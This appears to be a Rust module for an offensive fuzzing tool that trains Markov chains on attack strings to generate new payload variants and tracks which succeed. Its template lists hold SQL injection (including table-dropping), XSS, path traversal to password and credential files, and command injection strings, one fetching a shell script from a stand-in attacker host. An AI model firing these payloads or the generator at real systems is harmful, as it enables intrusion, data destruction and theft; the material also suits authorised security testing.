//! Markov Chain Payload Builder - Adaptive syntax generation without LLMs
//!
//! Uses Markov chains to learn and generate payloads based on observed
//! patterns from successful attacks and known vulnerability signatures.

use std::collections::{HashMap, HashSet};
use std::fs::{File, OpenOptions};
use std::io::{BufRead, BufReader, Write};
use std::path::{Path, PathBuf};
use rand::Rng;

/// Order of the Markov chain (n-gram size)
const MARKOV_ORDER: usize = 3;

/// Markov chain state transition table
#[derive(Debug, Default)]
pub struct MarkovChain {
    /// Transition probabilities: state -> [(next_char, probability)]
    transitions: HashMap<String, Vec<(char, f64)>>,
    /// Starting characters with frequencies
    starts: HashMap<char, u64>,
    /// Total observations
    total_observations: u64,
}

impl MarkovChain {
    pub fn new() -> Self {
        Self::default()
    }

    /// Train the Markov chain on a corpus of strings
    pub fn train(&mut self, corpus: &[&str]) {
        for text in corpus {
            self.train_on_string(text);
        }
    }

    /// Train on a single string
    pub fn train_on_string(&mut self, text: &str) {
        if text.is_empty() {
            return;
        }

        let chars: Vec<char> = text.chars().collect();
        
        // Record starting character
        *self.starts.entry(chars[0]).or_insert(0) += 1;
        self.total_observations += 1;

        // Build n-gram transitions
        for i in 0..chars.len() {
            let state_start = i.saturating_sub(MARKOV_ORDER);
            let state: String = chars[state_start..=i].iter().collect();
            
            if i + 1 < chars.len() {
                let next_char = chars[i + 1];
                
                let entries = self.transitions.entry(state).or_default();
                if let Some(pos) = entries.iter().position(|(c, _)| *c == next_char) {
                    entries[pos].1 += 1.0;
                } else {
                    entries.push((next_char, 1.0));
                }
            }
        }
    }

    /// Normalize transition probabilities
    pub fn normalize(&mut self) {
        for (_, transitions) in self.transitions.iter_mut() {
            let total: f64 = transitions.iter().map(|(_, p)| p).sum();
            if total > 0.0 {
                for (_, p) in transitions.iter_mut() {
                    *p /= total;
                }
            }
        }
    }

    /// Generate a new string using the Markov chain
    pub fn generate(&self, max_length: usize) -> String {
        let mut rng = rand::rngs::StdRng::seed_from_u64(
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos() as u64
        );

        // Select starting character weighted by frequency
        let start_char = {
            let total: u64 = self.starts.values().sum();
            if total == 0 {
                return String::new();
            }
            
            let mut roll = rng.gen_range(0..total);
            let mut selected = ' ';
            for (&ch, &freq) in &self.starts {
                if roll < freq {
                    selected = ch;
                    break;
                }
                roll -= freq;
            }
            selected
        };

        let mut result = String::from(start_char);
        let mut state = String::from(start_char);

        while result.len() < max_length {
            // Get current state (last N characters)
            if state.len() > MARKOV_ORDER {
                state = state.chars().skip(state.len() - MARKOV_ORDER).collect();
            }

            if let Some(transitions) = self.transitions.get(&state) {
                // Select next character based on probabilities
                let total: f64 = transitions.iter().map(|(_, p)| p).sum();
                if total <= 0.0 {
                    break;
                }

                let mut roll = rng.gen::<f64>() * total;
                let mut next_char = None;

                for &(ch, prob) in transitions {
                    if roll < prob {
                        next_char = Some(ch);
                        break;
                    }
                    roll -= prob;
                }

                if let Some(ch) = next_char {
                    result.push(ch);
                    state.push(ch);
                } else {
                    break;
                }
            } else {
                break;
            }
        }

        result
    }

    /// Generate multiple variants
    pub fn generate_variants(&self, count: usize, max_length: usize) -> Vec<String> {
        (0..count).map(|_| self.generate(max_length)).collect()
    }

    /// Get the number of trained states
    pub fn state_count(&self) -> usize {
        self.transitions.len()
    }

    /// Clear all training data
    pub fn clear(&mut self) {
        self.transitions.clear();
        self.starts.clear();
        self.total_observations = 0;
    }

    /// Merge another Markov chain into this one
    pub fn merge(&mut self, other: &MarkovChain) {
        for (state, transitions) in &other.transitions {
            let existing = self.transitions.entry(state.clone()).or_default();
            for &(ch, prob) in transitions {
                if let Some(pos) = existing.iter().position(|(c, _)| *c == ch) {
                    existing[pos].1 += prob;
                } else {
                    existing.push((ch, prob));
                }
            }
        }

        for (&ch, &freq) in &other.starts {
            *self.starts.entry(ch).or_insert(0) += freq;
        }

        self.total_observations += other.total_observations;
    }
}

/// Payload pattern learned from training data
#[derive(Debug, Clone)]
pub struct PayloadPattern {
    pub name: String,
    pub class: String,
    pub markov_chain: MarkovChain,
    pub success_count: u64,
    pub failure_count: u64,
}

impl PayloadPattern {
    pub fn new(name: impl Into<String>, class: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            class: class.into(),
            markov_chain: MarkovChain::new(),
            success_count: 0,
            failure_count: 0,
        }
    }

    pub fn success_rate(&self) -> f64 {
        let total = self.success_count + self.failure_count;
        if total == 0 {
            0.0
        } else {
            self.success_count as f64 / total as f64
        }
    }

    pub fn record_success(&mut self) {
        self.success_count += 1;
    }

    pub fn record_failure(&mut self) {
        self.failure_count += 1;
    }
}

/// Markov-based payload builder for adaptive generation
#[derive(Debug)]
pub struct MarkovPayloadBuilder {
    patterns: HashMap<String, PayloadPattern>,
    persistence_path: Option<PathBuf>,
}

impl MarkovPayloadBuilder {
    pub fn new() -> Self {
        Self {
            patterns: HashMap::new(),
            persistence_path: None,
        }
    }

    /// Set persistence path for saving/loading patterns
    pub fn with_persistence(mut self, path: impl Into<PathBuf>) -> Self {
        self.persistence_path = Some(path.into());
        self
    }

    /// Register a new pattern category
    pub fn register_pattern(&mut self, name: &str, class: &str) {
        self.patterns.insert(name.to_string(), PayloadPattern::new(name, class));
    }

    /// Train a pattern on sample payloads
    pub fn train_pattern(&mut self, pattern_name: &str, samples: &[&str]) {
        if let Some(pattern) = self.patterns.get_mut(pattern_name) {
            pattern.markov_chain.train(samples);
            pattern.markov_chain.normalize();
        }
    }

    /// Generate payloads from a trained pattern
    pub fn generate_from_pattern(&self, pattern_name: &str, count: usize) -> Vec<String> {
        if let Some(pattern) = self.patterns.get(pattern_name) {
            pattern.markov_chain.generate_variants(count, 256)
        } else {
            Vec::new()
        }
    }

    /// Record success for a pattern
    pub fn record_success(&mut self, pattern_name: &str) {
        if let Some(pattern) = self.patterns.get_mut(pattern_name) {
            pattern.record_success();
        }
    }

    /// Record failure for a pattern
    pub fn record_failure(&mut self, pattern_name: &str) {
        if let Some(pattern) = self.patterns.get_mut(pattern_name) {
            pattern.record_failure();
        }
    }

    /// Get patterns sorted by success rate
    pub fn get_best_patterns(&self, min_samples: u64) -> Vec<&PayloadPattern> {
        let mut patterns: Vec<&PayloadPattern> = self.patterns.values().collect();
        patterns.retain(|p| p.success_count + p.failure_count >= min_samples);
        patterns.sort_by(|a, b| {
            b.success_rate().partial_cmp(&a.success_rate()).unwrap_or(std::cmp::Ordering::Equal)
        });
        patterns
    }

    /// Save patterns to disk
    pub fn save(&self) -> Result<(), std::io::Error> {
        if let Some(ref path) = self.persistence_path {
            if let Some(parent) = path.parent() {
                std::fs::create_dir_all(parent)?;
            }
            
            let mut file = File::create(path)?;
            
            for (name, pattern) in &self.patterns {
                writeln!(file, "PATTERN:{}:{}", name, pattern.class)?;
                writeln!(file, "STATS:{}:{}", pattern.success_count, pattern.failure_count)?;
                
                // Save start characters
                for (&ch, &freq) in &pattern.markov_chain.starts {
                    writeln!(file, "START:{}:{}", ch, freq)?;
                }
                
                // Save transitions
                for (state, transitions) in &pattern.markov_chain.transitions {
                    for &(ch, prob) in transitions {
                        writeln!(file, "TRANS:{}:{}:{}:{}", state.replace('\n', "\\n"), ch, prob, state.len())?;
                    }
                }
                
                writeln!(file, "END_PATTERN")?;
            }
        }
        Ok(())
    }

    /// Load patterns from disk
    pub fn load(&mut self) -> Result<(), std::io::Error> {
        if let Some(ref path) = self.persistence_path {
            if !path.exists() {
                return Ok(());
            }

            let file = File::open(path)?;
            let reader = BufReader::new(file);
            
            let mut current_pattern: Option<(String, String)> = None;
            
            for line in reader.lines() {
                let line = line?;
                let parts: Vec<&str> = line.split(':').collect();
                
                if parts.is_empty() {
                    continue;
                }

                match parts[0] {
                    "PATTERN" if parts.len() >= 3 => {
                        let name = parts[1].to_string();
                        let class = parts[2].to_string();
                        self.patterns.insert(name.clone(), PayloadPattern::new(&name, &class));
                        current_pattern = Some((name, class));
                    }
                    "STATS" if parts.len() >= 3 && current_pattern.is_some() => {
                        if let Some((ref name, _)) = current_pattern {
                            if let Ok(success) = parts[1].parse::<u64>() {
                                if let Ok(failure) = parts[2].parse::<u64>() {
                                    if let Some(pattern) = self.patterns.get_mut(name) {
                                        pattern.success_count = success;
                                        pattern.failure_count = failure;
                                    }
                                }
                            }
                        }
                    }
                    "START" if parts.len() >= 3 && current_pattern.is_some() => {
                        if let Some((ref name, _)) = current_pattern {
                            if let Some(ch) = parts[1].chars().next() {
                                if let Ok(freq) = parts[2].parse::<u64>() {
                                    if let Some(pattern) = self.patterns.get_mut(name) {
                                        *pattern.markov_chain.starts.entry(ch).or_insert(0) += freq;
                                    }
                                }
                            }
                        }
                    }
                    "TRANS" if parts.len() >= 5 && current_pattern.is_some() => {
                        if let Some((ref name, _)) = current_pattern {
                            let state = parts[1].replace("\\n", "\n");
                            if let Some(ch) = parts[2].chars().next() {
                                if let Ok(prob) = parts[3].parse::<f64>() {
                                    if let Some(pattern) = self.patterns.get_mut(name) {
                                        let entries = pattern.markov_chain.transitions.entry(state.clone()).or_default();
                                        entries.push((ch, prob));
                                    }
                                }
                            }
                        }
                    }
                    "END_PATTERN" => {
                        current_pattern = None;
                    }
                    _ => {}
                }
            }
        }
        Ok(())
    }

    /// Get all available pattern names
    pub fn list_patterns(&self) -> Vec<&String> {
        self.patterns.keys().collect()
    }

    /// Remove a pattern
    pub fn remove_pattern(&mut self, name: &str) -> Option<PayloadPattern> {
        self.patterns.remove(name)
    }
}

impl Default for MarkovPayloadBuilder {
    fn default() -> Self {
        Self::new()
    }
}

/// Pre-built payload templates for initial Markov training
pub mod payload_templates {
    /// SQL injection templates
    pub const SQL_INJECTION: &[&str] = &[
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "1 UNION SELECT NULL--",
        "admin'--",
        "' AND 1=1--",
        "' AND '1'='1",
        "1; DELETE FROM users--",
        "' OR ''='",
        "1' ORDER BY 1--",
        "1' UNION SELECT NULL,NULL--",
        "' WAITFOR DELAY '0:0:5'--",
    ];

    /// XSS templates
    pub const XSS: &[&str] = &[
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=\"javascript:alert(1)\">",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ];

    /// Path traversal templates
    pub const PATH_TRAVERSAL: &[&str] = &[
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "file:///etc/passwd",
    ];

    /// Command injection templates
    pub const COMMAND_INJECTION: &[&str] = &[
        "; ls",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
        "&& echo pwned",
        "|| echo failed",
        "; wget http://evil.com/shell.sh",
    ];
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_markov_training() {
        let mut chain = MarkovChain::new();
        chain.train(&payload_templates::SQL_INJECTION);
        chain.normalize();
        
        assert!(chain.state_count() > 0);
    }

    #[test]
    fn test_markov_generation() {
        let mut chain = MarkovChain::new();
        chain.train(&["hello world", "hello there", "hi world"]);
        chain.normalize();
        
        let generated = chain.generate(20);
        assert!(!generated.is_empty());
    }

    #[test]
    fn test_payload_builder() {
        let mut builder = MarkovPayloadBuilder::new();
        
        builder.register_pattern("sqli", "SqlInjection");
        builder.train_pattern("sqli", &payload_templates::SQL_INJECTION);
        
        let generated = builder.generate_from_pattern("sqli", 5);
        assert_eq!(generated.len(), 5);
    }

    #[test]
    fn test_pattern_success_tracking() {
        let mut builder = MarkovPayloadBuilder::new();
        builder.register_pattern("test", "Test");
        
        builder.record_success("test");
        builder.record_success("test");
        builder.record_failure("test");
        
        let patterns = builder.get_best_patterns(0);
        assert!(!patterns.is_empty());
        assert!(patterns[0].success_rate() > 0.6);
    }
}
